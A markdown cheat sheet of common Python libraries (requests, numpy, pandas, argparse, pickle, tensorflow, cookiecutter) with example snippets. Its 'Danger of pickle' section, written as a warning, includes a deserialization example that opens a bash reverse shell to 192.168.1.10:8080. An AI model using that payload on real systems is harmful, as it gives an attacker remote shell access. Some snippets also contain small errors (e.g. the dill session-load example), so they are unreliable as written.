---
topic: Python_libraries
date: 2023/04/21
project: cheatsheet
type: note
---

# Python_libraries

# Python libraries
[Readme](../README.md) &nbsp; [python](python.md)
- [Python\_libraries](#python_libraries)
- [Python libraries](#python-libraries)
	- [Libraries overview](#libraries-overview)
		- [requests](#requests)
			- [get request](#get-request)
			- [post request](#post-request)
		- [numpy](#numpy)
			- [Default commands](#default-commands)
			- [Importing/exporting](#importingexporting)
			- [Creating Arrays](#creating-arrays)
			- [Inspecting Properties](#inspecting-properties)
			- [Copying/sorting/reshaping](#copyingsortingreshaping)
			- [Adding/removing Elements](#addingremoving-elements)
			- [Combining/splitting](#combiningsplitting)
			- [Indexing/slicing/subsetting](#indexingslicingsubsetting)
			- [Scalar Math](#scalar-math)
			- [Vector Math](#vector-math)
			- [Statistics](#statistics)
		- [pandas](#pandas)
			- [Import](#import)
			- [Export](#export)
			- [Create Test Objects](#create-test-objects)
			- [Viewing/Inspecting Data](#viewinginspecting-data)
			- [Selection](#selection)
			- [Data Cleaning](#data-cleaning)
			- [Filter, Sort, and Groupby](#filter-sort-and-groupby)
			- [Join/Combine](#joincombine)
			- [Statistics](#statistics-1)
		- [argparse](#argparse)
		- [pickle](#pickle)
			- [Object](#object)
			- [Lambda](#lambda)
			- [Session](#session)
			- [Danger of pickle](#danger-of-pickle)
		- [tensorflow](#tensorflow)
			- [Important notes](#important-notes)
			- [Default commands](#default-commands-1)
			- [Tensor variables and operations](#tensor-variables-and-operations)
			- [GradientTape](#gradienttape)
		- [cookiecutter](#cookiecutter)
			- [Templates](#templates)

## Libraries overview

| Name         | Usage                                   | Examples                                                                                |
| ------------ | :-------------------------------------- | :-------------------------------------------------------------------------------------- |
| math         | More complex mathematical funtions      | ```math.floor(), math.sqrt(), math.pow() ```                                            |
| Requests     | Make get, post requests                 | [Examples](#requests)                                                                   |
| os           | To edit files                           | ```os.listdir(path), os.rmdir(path), os.path.getsize(filename) ```                      |
| numpy        | arrays of data                          | [numpy](#numpy)                                                                         |
| gandas       | dataframes of data                      | [pandas](#pandas)                                                                       |
| geopandas    | dataframes with coordinates/shapes      | [geopandas (online)](https://geopandas.org/en/stable/getting_started/introduction.html) |
| xarray       | n dim array                             | [xarray (online)](https://docs.xarray.dev/en/stable/)                                   |
| argparse     | parsing arguments                       | [argparse]](#argparse)                                                                  |
| matplotlib   | used to plot data                       | [matplot (online)](https://matplotlib.org/stable/index.html)                            |
| seaborn      | used to plot data based on matplotlib   | [seaborn (online)](https://seaborn.pydata.org/examples/index.html)                      |
| hvplot       | used to plot xarray data or interactive | [hvplot (online)](https://hvplot.holoviz.org/user_guide/index.html)                     |
| sklearn      | To make ML models and more              | [scikit-learn (online)](https://scikit-learn.org/stable/user_guide.html)                |
| pickle       | To serialize Python objects             | [Pickle (online)](https://docs.python.org/3/library/pickle.html)                        |
| cookiecutter | Create Python project templates         | [cookiecutter](#cookiecutter)                                                           |


### requests
#### get request

```python
import requests
url = 'https://api.github.com/users/jarneamerlinck'
response = requests.get(url)
if response.status_code == 200:
    print('Success!')
    print(response.content)
else:
  print("not succesfull")
```
#### post request

```python
import requests
url = 'https://www.w3schools.com/python/demopage.php'
myobj = {'somekey': 'somevalue'}

r = requests.post(url, json = myobj)

print(r.text)
```


### [numpy](https://numpy.org/doc/stable/user/index.html#user)
- Numpy is an package for multidimentional array objects

```python
import numpy as np
n = np.arange(24).reshape(3, 4, 2)
```
#### Default commands
n = numpy.ndarray
#### Importing/exporting

| What                  | Command                                        |
| --------------------- | :--------------------------------------------- |
| From a text file      | ```np.loadtxt('file.txt')```                   |
| From a CSV file       | ```np.genfromtxt('file.csv',delimiter=',')```  |
| Writes to a text file | ```np.savetxt('file.txt',arr,delimiter=' ')``` |
| Writes to a CSV file  | ```np.savetxt('file.csv',arr,delimiter=',')``` |

#### Creating Arrays

| What                                                              | Command                               |
| ----------------------------------------------------------------- | :------------------------------------ |
| One dimensional array                                             | ```np.array([1,2,3]) ```              |
| Two dimensional                                                   | ```np.array([(1,2,3),(4,5,6)]) ```    |
| 1D array of length 3 all values 0                                 | ```array np.zeros(3)  ```             |
| 3x4 array with all values 1                                       | ```np.ones((3,4)) ```                 |
| 5x5 array of 0 with 1 on diagonal (Identity matrix)               | ```np.eye(5)  ```                     |
| Array of 6 evenly divided values from 0 to 100                    | ```np.linspace(0,100,6) ```           |
| Array of values from 0 to less than 10 with step 3 (eg [0,3,6,9]) | ```np.arange(0,10,3) ```              |
| 2x3 array with all values 8                                       | ```np.full((2,3),8) ```               |
| 4x5 array of random floats between 0–1                            | ```np.random.rand(4,5)  ```           |
| 6x7 array of random floats between 0–100                          | ```np.random.rand(6,7)*100 ```        |
| 2x3 array with random ints between 0–4                            | ```np.random.randint(5,size=(2,3))``` |


#### Inspecting Properties

| What                                     | Command                 |
| ---------------------------------------- | :---------------------- |
| Returns number of elements in arr        | ```arr.size```          |
| Returns dimensions of arr (rows,columns) | ```arr.shape```         |
| Returns type of elements in arr          | ```arr.dtype```         |
| Convert arr elements to type dtype       | ```arr.astype(dtype)``` |
| Convert arr to a Python list             | ```arr.tolist()```      |
| View documentation for np.eye            | ```np.info(np.eye) ```  |


#### Copying/sorting/reshaping

| What                                                    | Command                    |
| ------------------------------------------------------- | :------------------------- |
| Copies arr to new memory                                | ```np.copy(arr)  ```       |
| Creates view of arr elements with type dtype            | ```arr.view(dtype) ```     |
| Sorts arr                                               | ```arr.sort()   ```        |
| Sorts specific axis of arr                              | ```arr.sort(axis=0) ```    |
| Flattens 2D array two_d_arr to 1D                       | ```two_d_arr.flatten() ``` |
| Transposes arr (rows become columns and vice versa)     | ```arr.T ```               |
| Reshapes arr to 3 rows, 4 columns without changing data | ```arr.reshape(3,4) ```    |
| Changes arr shape to 5x6 and fills new values with 0    | ```arr.resize((5,6)) ```   |


#### Adding/removing Elements

| What                                   | Command                        |
| -------------------------------------- | :----------------------------- |
| Appends values to end of arr           | ```np.append(arr,values)   ``` |
| Inserts values into arr before index 2 | ```np.insert(arr,2,values) ``` |
| Deletes row on index 3 of arr          | ```np.delete(arr,3,axis=0)```  |
| Deletes column on index 4 of arr       | ```np.delete(arr,4,axis=1)```  |


#### Combining/splitting

| What                                     | Command                                  |
| ---------------------------------------- | :--------------------------------------- |
| Adds arr2 as rows to the end of arr1     | ```np.concatenate((arr1,arr2),axis=0)``` |
| Adds arr2 as columns to end of arr1      | ```np.concatenate((arr1,arr2),axis=1)``` |
| Splits arr into 3 sub-arrays             | ```np.split(arr,3)```                    |
| Splits arr horizontally on the 5th index | ```np.hsplit(arr,5)```                   |


#### Indexing/slicing/subsetting

| What                                                                      | Command                   |
| ------------------------------------------------------------------------- | :------------------------ |
| Returns the element at index 5                                            | ```arr[5] ```             |
| Returns the 2D array element on index [2][5]                              | ```arr[2,5]```            |
| Assigns array element on index 1 the value 4                              | ```arr[1]=4```            |
| Assigns array element on index [1][3] the value 10                        | ```arr[1,3]=10```         |
| Returns the elements at indices 0,1,2 (On a 2D array: returns rows 0,1,2) | ```arr[0:3]```            |
| Returns the elements on rows 0,1,2 at column 4                            | ```arr[0:3,4]```          |
| Returns the elements at indices 0,1 (On a 2D array: returns rows 0,1)     | ```arr[:2] ```            |
| Returns the elements at index 1 on all rows                               | ```arr[:,1] ```           |
| Returns an array with boolean values                                      | ```arr<5 ```              |
| Returns an array with boolean values                                      | ```(arr1<3) & (arr2>5)``` |
| Inverts a boolean array                                                   | ```~arr ```               |
| Returns array elements smaller than 5                                     | ```arr[arr<5]```          |


#### Scalar Math

| What                                                                 | Command                  |
| -------------------------------------------------------------------- | :----------------------- |
| Add 1 to each array element                                          | ```np.add(arr,1)```      |
| Subtract 2 from each array element                                   | ```np.subtract(arr,2)``` |
| Multiply each array element by 3                                     | ```np.multiply(arr,3)``` |
| Divide each array element by 4 (returns np.nan for division by zero) | ```np.divide(arr,4)```   |
| Raise each array element to the 5th power                            | ```np.power(arr,5)```    |


#### Vector Math

| What                                                        | Command                         |
| ----------------------------------------------------------- | :------------------------------ |
| Elementwise add arr2 to arr1                                | ```np.add(arr1,arr2)```         |
| Elementwise subtract arr2 from arr1                         | ```np.subtract(arr1,arr2)```    |
| Elementwise multiply arr1 by arr2                           | ```np.multiply(arr1,arr2)```    |
| Elementwise divide arr1 by arr2                             | ```np.divide(arr1,arr2)```      |
| Elementwise raise arr1 raised to the power of arr2          | ```np.power(arr1,arr2)```       |
| Returns True if the arrays have the same elements and shape | ```np.array_equal(arr1,arr2)``` |
| Square root of each element in the array                    | ```np.sqrt(arr)```              |
| Sine of each element in the array                           | ```np.sin(arr)```               |
| Natural log of each element in the array                    | ```np.log(arr)```               |
| Absolute value of each element in the array                 | ```np.abs(arr)```               |
| Rounds up to the nearest int                                | ```np.ceil(arr)```              |
| Rounds down to the nearest int                              | ```np.floor(arr)```             |
| Rounds to the nearest int                                   | ```np.round(arr)```             |


#### Statistics

| What                                            | Command                   |
| ----------------------------------------------- | :------------------------ |
| Returns mean along specific axis                | ```np.mean(arr,axis=0)``` |
| Returns sum of arr                              | ```arr.sum()```           |
| Returns minimum value of arr                    | ```arr.min()```           |
| Returns maximum value of specific axis          | ```arr.max(axis=0)```     |
| Returns the variance of array                   | ```np.var(arr) ```        |
| Returns the standard deviation of specific axis | ```np.std(arr,axis=1)```  |
| Returns correlation coefficient of array        | ```arr.corrcoef()```      |


### [pandas](https://pandas.pydata.org/)
#### Import

| What                                                                           | Command                                     |
| ------------------------------------------------------------------------------ | :------------------------------------------ |
| From a CSV file                                                                | ```pd.read_csv(filename) ```                |
| From a delimited text file (like TSV)                                          | ```pd.read_table(filename)  ```             |
| From an Excel file                                                             | ```pd.read_excel(filename) ```              |
| Read from a SQL table/database                                                 | ```pd.read_sql(query, connection_object)``` |
| Read from a JSON formatted string, URL or file.                                | ```pd.read_json(json_string)```             |
| Parses an html URL, string or file and extracts tables to a list of dataframes | ```pd.read_html(url) ```                    |
| Takes the contents of your clipboard and passes it to read_table()             | ```pd.read_clipboard()   ```                |
| From a dict, keys for columns names, values for data as lists                  | ```pd.DataFrame(dict)```                    |

#### Export

| What                           | Command                                         |
| ------------------------------ | :---------------------------------------------- |
| Write to a CSV file            | ```df.to_csv(filename) ```                      |
| Write to an Excel file         | ```df.to_excel(filename)  ```                   |
| Write to a SQL table           | ```df.to_sql(table_name, connection_object) ``` |
| Write to a file in JSON format | ```df.to_json(filename)  ```                    |


#### Create Test Objects

| What                                     | Command                                                          |
| ---------------------------------------- | :--------------------------------------------------------------- |
| 5 columns and 20 rows of random floats   | ```pd.DataFrame(np.random.rand(20,5)) ```                        |
| Create a series from an iterable my_list | ```pd.Series(my_list)  ```                                       |
| Add a date index                         | ```df.index = pd.date_range('1900/1/30', periods=df.shape[0])``` |


#### Viewing/Inspecting Data

| What                                     | Command                                |
| ---------------------------------------- | :------------------------------------- |
| First n rows of the DataFrame            | ```df.head(n)  ```                     |
| Last n rows of the DataFrame             | ```df.tail(n) ```                      |
| Number of rows and columns               | ```df.shape  ```                       |
| Index, Datatype and Memory information   | ```df.info()  ```                      |
| Summary statistics for numerical columns | ```df.describe()  ```                  |
| View unique values and counts            | ```s.value_counts(dropna=False)```     |
| Unique values and counts for all columns | ```df.apply(pd.Series.value_counts)``` |


#### Selection

| What                                    | Command                   |
| --------------------------------------- | :------------------------ |
| Returns column with label col as Series | ```df[col] ```            |
| Returns columns as a new DataFrame      | ```df[[col1, col2]] ```   |
| Selection by position                   | ```s.iloc[0]```           |
| Selection by index                      | ```s.loc['index_one'] ``` |
| First row                               | ```df.iloc[0,:]  ```      |
| First element of first column           | ```df.iloc[0,0]  ```      |
| Take all but last column                | ```df.iloc[:, :-1]```     |


#### Data Cleaning

| What                                                                                 | Command                                            |
| ------------------------------------------------------------------------------------ | :------------------------------------------------- |
| Rename columns                                                                       | ```df.columns = ['a','b','c'] ```                  |
| Checks for null Values, Returns Boolean Arrray                                       | ```pd.isnull()```                                  |
| Opposite of pd.isnull()                                                              | ```pd.notnull()  ```                               |
| Drop all rows that contain null values                                               | ```df.dropna()```                                  |
| Drop all columns that contain null values                                            | ```df.dropna(axis=1)   ```                         |
| Drop all rows have have less than n non null values                                  | ```df.dropna(axis=1,thresh=n)  ```                 |
| Replace all null values with x                                                       | ```df.fillna(x)   ```                              |
| Replace all null values with the mean (can be most functions from statistics module) | ```s.fillna(s.mean()) ```                          |
| Convert the datatype of the series to float                                          | ```s.astype(float)   ```                           |
| Replace all values equal to 1 with ‘one’                                             | ```s.replace(1,'one')  ```                         |
| Replace all 1 with ‘one’ and 3 with ‘three’                                          | ```s.replace([1,3],['one','three']) ```            |
| Mass renaming of columns                                                             | ```df.rename(columns=lambda x: x + 1)   ```        |
| Selective renaming                                                                   | ```df.rename(columns={'old_name': 'new_ name'})``` |
| Change the index                                                                     | ```df.set_index('column_one') ```                  |
| Mass renaming of index                                                               | ```df.rename(index=lambda x: x + 1)  ```           |


#### Filter, Sort, and Groupby

| What                                                                                                                 | Command                                                           |
| -------------------------------------------------------------------------------------------------------------------- | :---------------------------------------------------------------- |
| Rows where the column col is greater than 0.5                                                                        | ```df[df[col] > 0.5] ```                                          |
| Rows where 0.7 > col > 0.5                                                                                           | ```df[(df[col] > 0.5) & (df[col] < 0.7)] ```                      |
| Sort values by col1 in ascending order                                                                               | ```df.sort_values(col1) ```                                       |
| Sort values by col2 in descending order                                                                              | ```df.sort_values(col2,ascending=False)  ```                      |
| Sort values by col1 in ascending order then col2 in descending order                                                 | ```df.sort_values([col1,col2],ascending=[True,False])```          |
| Returns a groupby object for values from one column                                                                  | ```df.groupby(col)```                                             |
| Returns groupby object for values from multiple columns                                                              | ```df.groupby([col1,col2])  ```                                   |
| Returns the mean of the values in col2, grouped by the values in col1 (can be most functions from statistics module) | ```df.groupby(col1)[col2]  ```                                    |
| Create a pivot table that groups by col1 and calculates the mean of col2 and col3                                    | ```df.pivot_table(index=col1,values=[col2,col3],aggfunc=mean) ``` |
| Find the average across all columns for every unique col1 group                                                      | ```df.groupby(col1).agg(np.mean)  ```                             |
| Apply the function np.mean() across each column                                                                      | ```df.apply(np.mean)  ```                                         |
| Apply the function np.max() across each row                                                                          | ```df.apply(np.max,axis=1) ```                                    |
| Apply lambda to dataframe row                                                                                        | ```df.apply(lambda x: x,axis=1) ```                               |
| Shuffle rows                                                                                                         | ```df.sample(frac = 1) ```                                        |


#### Join/Combine

| What                                                                                                                                                              | Command                                  |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------- |
| Add the rows in df1 to the end of df2 (columns should be identical)                                                                                               | ```df1.append(df2) ```                   |
| Add the columns in df1 to the end of df2 (rows should be identical)                                                                                               | ```pd.concat([df1, df2],axis=1) ```      |
| SQL-style join the columns in df1 with the columns on df2 where the rows for col have identical values. <br>'how' can be one of 'left', 'right', 'outer', 'inner' | ```df1.join(df2,on=col1,how='inner') ``` |


#### Statistics

| What                                                           | Command             |
| -------------------------------------------------------------- | :------------------ |
| Summary statistics for numerical columns                       | ```df.describe()``` |
| Returns the mean of all columns                                | ```df.mean()```     |
| Returns the correlation between columns in a DataFrame         | ```df.corr()```     |
| Returns the number of non-null values in each DataFrame column | ```df.count()```    |
| Returns the highest value in each column                       | ```df.max()```      |
| Returns the lowest value in each column                        | ```df.min()```      |
| Returns the median of each column                              | ```df.median()```   |
| Returns the standard deviation of each column                  | ```df.std()```      |





### argparse

```python
import argparse
parser = argparse.ArgumentParser(prog='PROG', usage='%(prog)s [options]')
parser.add_argument('--foo', nargs='?', help='foo help')
parser.add_argument('bar', nargs='+', help='bar help')
args = parser.parse_args()
```

result

```output
usage: PROG [options]

positional arguments:
 bar          bar help

options:
 -h, --help   show this help message and exit
 --foo [FOO]  foo help
```



### pickle

#### Object
Serialize object
```python
import pickle
mylist = ['a', 'b', 'c', 'd']
with open('datafile.pkl', 'wb') as file:
   pickle.dump(mylist, file)
```

Load object

```python
import pickle
pickle_off = open ("datafile.pkl", "rb")
emp = pickle.load(pickle_off)
print(emp)
```

#### Lambda
Serialize lambda
```python
import dill
square = lambda x: x * x
with open('lambda_example.pkl', 'wb') as file:
   dill.dump(square, file)
```

Load lambda

```python
import dill
pickle_off = open ("lambda_example.pkl", "rb")
emp = dill.load(pickle_off)
emp(6)
```

#### Session
Serialize session
```python
import dill
square = lambda x: x * x
with open('session.pkl', 'wb') as file:
   dill.dump_session( file)
```

Load session

```python
import dill
with open('session.pkl', 'wb') as file:
  dill.load_session(pickle_off)

```

#### Danger of pickle

> The script below will run an command on the loading of a pickle
> 
> **Do not use the pickle module to deserialize objects from untrusted sources!** 
```python

# remote.py
import pickle
import os

class foobar:
    def __init__(self):
        pass

    def __getstate__(self):
        return self.__dict__

    def __setstate__(self, state):
        # The attack is from 192.168.1.10
        # The attacker is listening on port 8080
        os.system('/bin/bash -c
                  "/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1"')


my_foobar = foobar()
my_pickle = pickle.dumps(my_foobar)
my_unpickle = pickle.loads(my_pickle)

```

### tensorflow
#### Important notes

> Tensors are not assignable

```python
import tensorflow as tf
try:
    x[0, 0] = 0.
except TypeError as err:  # gives an TypeError
    print(err)
```
- use TensorFlow variables



#### Default commands

| What                                | Command                                                         | Numpy variant                                         |
| ----------------------------------- | :-------------------------------------------------------------- | :---------------------------------------------------- |
| Import tensorflow                   | ```import tensorflow as tf```                                   |                                                       |
| Tensor with 1's                     | ```tf.ones(shape=(2, 1))```                                     | ```np.ones(shape=(2, 1))```                           |
| Tensor with 0's                     | ```tf.zeros(shape=(2, 1))```                                    | ```np.zeros(shape=(2, 1))```                          |
| Normally distributed random numbers | ```tf.random.normal(shape=(3, 1), mean=0., stddev=1.)```        | ```np.random.normal(size=(3, 1), loc=0., scale=1.)``` |
| Uniform distributed random numbers  | ```tf.random.uniform(shape=(3, 1), minval=0., maxval=1.)```     | ```np.random.uniform(size=(3, 1), low=0., high=1.)``` |
| Create tensor variables             | ```tf.Variable(initial_value=tf.random.normal(shape=(3, 1)))``` |                                                       |

#### Tensor variables and operations

| What                            | Command                                                                      |
| ------------------------------- | :--------------------------------------------------------------------------- |
| Asign value to tensor variables | ```v.assign(tf.ones((3, 1)))``` <br> ```v[0, 0].assign(3.)```                |
| Update tenser variables         | ```v.assign_add(tf.ones((3, 1)))``` <br> ```v.assign_sub(tf.ones((3, 1)))``` |
| Power of 2                      | ```tf.square(a)```                                                           |
| Sqrt                            | ```tf.sqrt(a)```                                                             |
| Matrix multiplication           | ```tf.matmul(a, b)```                                                        |
| Elementwise multiplication      | ```e *= d```                                                                 |


#### GradientTape

> An gradient is a derivative (nl afgeleide)

- Default

```python
input_var = tf.Variable(initial_value=3.0)
with tf.GradientTape() as tape:
    result = tf.square(input_var)
gradient = tape.gradient(result, input_var)  # derivative of x**2 for x = 3
print(gradient)  # will print 6 as 2 * x = 6 
```
- Multidimentional gradient
  - Watch has to be used for a constant tensor (to spare resources)

```python
input_const = tf.constant(3.0)
with tf.GradientTape() as tape:
    tape.watch(input_const)  # watch constant
    result = tf.square(input_const)
gradient = tape.gradient(result, input_const)
print(gradient)
```

  - Example of Multidimentional gradient

C is a constant of 4.9
> $x = c t^2$

> $v = \frac{dx}{dt}$

> $a = \frac{dv}{dt} = \frac{d^2x}{dt^2}$

```python
t = tf.Variable(10.0)  # Needs to be a float
with tf.GradientTape() as outer_tape:
    with tf.GradientTape() as inner_tape:
        x = 4.9 * t**2
    v = inner_tape.gradient(x, t)
a = outer_tape.gradient(v, t)
print(v)
print(a)
```



### [cookiecutter](https://www.cookiecutter.io/)

#### [Templates](https://www.cookiecutter.io/templates)


| Name                                                                                       | Usage                                                                                        |
| ------------------------------------------------------------------------------------------ | :------------------------------------------------------------------------------------------- |
| [data science](http://drivendata.github.io/cookiecutter-data-science/)                     | Use for all data science projects.                                                           |
| [full-stack-fastapi-postgresql](https://github.com/tiangolo/full-stack-fastapi-postgresql) | Generate a backend and frontend stack using Python, including interactive API documentation. |
